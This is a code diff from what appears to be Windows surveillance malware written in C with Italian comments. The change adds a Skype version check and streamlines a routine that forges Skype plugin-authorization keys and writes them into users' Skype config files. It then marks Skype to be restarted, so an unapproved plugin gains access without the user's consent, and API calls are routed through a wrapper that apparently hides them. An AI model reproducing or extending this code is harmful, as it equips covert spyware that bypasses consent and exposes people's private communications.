@@ -2074,7 +2074,7 @@ BOOL WriteSkypeACL(WCHAR *config_path, char *key1, char *key2, char *key3, char 
 		WriteFile(hFile, "<C>\r\n", strlen("<C>\r\n"), &dummy, NULL);
 	if (acl_missing)
 		WriteFile(hFile, "<AccessControlList>\r\n", strlen("<AccessControlList>\r\n"), &dummy, NULL);
-	if (isOld)
+	if (!isOld)
 		WriteFile(hFile, "<Client97>\r\n<Key1>", strlen("<Client97>\r\n<Key1>"), &dummy, NULL);
 	else
 		WriteFile(hFile, "<Client98>\r\n<Key1>", strlen("<Client98>\r\n<Key1>"), &dummy, NULL);
@@ -2091,7 +2091,7 @@ BOOL WriteSkypeACL(WCHAR *config_path, char *key1, char *key2, char *key3, char 
 	WriteFile(hFile, "</Key4>\r\n", strlen("</Key4>\r\n"), &dummy, NULL);
 	WriteFile(hFile, "<Path>", strlen("<Path>"), &dummy, NULL);
 	WriteFile(hFile, path, strlen(path), &dummy, NULL);
-	if (isOld)
+	if (!isOld)
 		WriteFile(hFile, "</Path>\r\n</Client97>\r\n", strlen("</Path>\r\n</Client97>\r\n"), &dummy, NULL);
 	else
 		WriteFile(hFile, "</Path>\r\n</Client98>\r\n", strlen("</Path>\r\n</Client98>\r\n"), &dummy, NULL);
@@ -2111,6 +2111,62 @@ BOOL WriteSkypeACL(WCHAR *config_path, char *key1, char *key2, char *key3, char 
 	CloseHandle(hFile);
 	return TRUE;
 }
+
+
+// Torna TRUE se e' precedente alla 5.5.0.X
+BOOL IsOldSkypeVersion(WCHAR *config_path)
+{
+	HANDLE hFile;
+	HANDLE hMap;
+	DWORD config_size;
+	char *config_map;
+	char *local_config_map, *ptr = NULL;
+
+	// Fa una copia del file in memoria
+	if ((hFile = FNC(CreateFileW)(config_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
+		return FALSE;
+	
+	config_size = GetFileSize(hFile, NULL);
+	if (config_size == INVALID_FILE_SIZE) {
+		CloseHandle(hFile);
+		return FALSE;
+	}
+	
+	local_config_map = (char *)calloc(config_size + 1, sizeof(char));
+	if (local_config_map == NULL) {
+		CloseHandle(hFile);
+		return FALSE;
+	}
+
+	if ((hMap = FNC(CreateFileMappingA)(hFile, NULL, PAGE_READONLY, 0, 0, NULL)) == INVALID_HANDLE_VALUE) {
+		SAFE_FREE(local_config_map);
+		CloseHandle(hFile);
+		return FALSE;
+	}
+
+	if (! (config_map = (char *)FNC(MapViewOfFile)(hMap, FILE_MAP_READ, 0, 0, 0)) ) {
+		SAFE_FREE(local_config_map);
+		CloseHandle(hMap);
+		CloseHandle(hFile);
+		return FALSE;
+	}
+
+	memcpy(local_config_map, config_map, config_size);
+	FNC(UnmapViewOfFile)(config_map);
+	CloseHandle(hMap);
+	
+	// Vede se manca la sezione <AccessContrlList>
+	if (strstr(local_config_map, "<LastWhatsNewGuideVersionStr>5.3.0.")) {
+		SAFE_FREE(local_config_map);
+		CloseHandle(hFile);
+		return TRUE;
+	}
+	
+	SAFE_FREE(local_config_map);
+	CloseHandle(hFile);
+	return FALSE;
+}
+
 
 extern BOOL SkypeACLKeyGen(char *lpUserName, char *lpFileName, char *lpOutKey1, char *lpOutKey2, char *lpOutKey3, char *lpOutKey4, char *lpOutPath, BOOL isOld);
 BOOL CalculateUserHash(WCHAR *user_name, WCHAR *file_path, char *m_key1, char *m_key2, char *m_key3, char *m_key4, char *m_path, BOOL isOld)
@@ -2216,7 +2272,7 @@ void CheckSkypePluginPermissions(DWORD skype_pid, WCHAR *skype_path)
 	HANDLE hFind, hSkype, hFile;
 	BOOL is_to_respawn = FALSE;
 	char m_key1[MAX_HASHKEY_LEN], m_key2[MAX_HASHKEY_LEN], m_key3[MAX_HASHKEY_LEN], m_key4[MAX_HASHKEY_LEN], m_path[MAX_HASHKEY_LEN];
-	BOOL missing_acl1 = FALSE, missing_acl2 = FALSE;
+	BOOL isOld;
 
 	// Trova il path di %appdata%\Skype
 	if(!FNC(GetEnvironmentVariableW)(L"appdata", skype_data, MAX_PATH)) 
@@ -2241,27 +2297,11 @@ void CheckSkypePluginPermissions(DWORD skype_pid, WCHAR *skype_path)
 				continue;
 			CloseHandle(hFile);
 			// Verifica se contiene gia' la permission altrimenti la scrive
-			missing_acl1 = FALSE;
-			missing_acl2 = FALSE;
-			
-			if (FindHashKeys(find_data.cFileName, core_path, m_key1, m_key2, m_key3, m_key4, m_path, FALSE))
+			isOld = IsOldSkypeVersion(config_path);			
+			if (FindHashKeys(find_data.cFileName, core_path, m_key1, m_key2, m_key3, m_key4, m_path, isOld))
 				if (!IsACLPresent(config_path, m_key1, m_key2, m_key3, m_key4, m_path))
-					missing_acl1 = TRUE;			
-
-			if (FindHashKeys(find_data.cFileName, core_path, m_key1, m_key2, m_key3, m_key4, m_path, TRUE)) 
-				if (!IsACLPresent(config_path, m_key1, m_key2, m_key3, m_key4, m_path))
-					missing_acl2 = TRUE;
-
-			if (missing_acl1 && missing_acl2) {
-				if (FindHashKeys(find_data.cFileName, core_path, m_key1, m_key2, m_key3, m_key4, m_path, FALSE))
-					if (WriteSkypeACL(config_path, m_key1, m_key2, m_key3, m_key4, m_path, TRUE)) {
+					if (WriteSkypeACL(config_path, m_key1, m_key2, m_key3, m_key4, m_path, isOld)) 
 						is_to_respawn = TRUE;
-					}
-				if (FindHashKeys(find_data.cFileName, core_path, m_key1, m_key2, m_key3, m_key4, m_path, TRUE)) 
-					if (WriteSkypeACL(config_path, m_key1, m_key2, m_key3, m_key4, m_path, FALSE)) {
-						is_to_respawn = TRUE;
-					}
-			}
 		}
 	} while (FNC(FindNextFileW)(hFind, &find_data));
 	FNC(FindClose)(hFind);
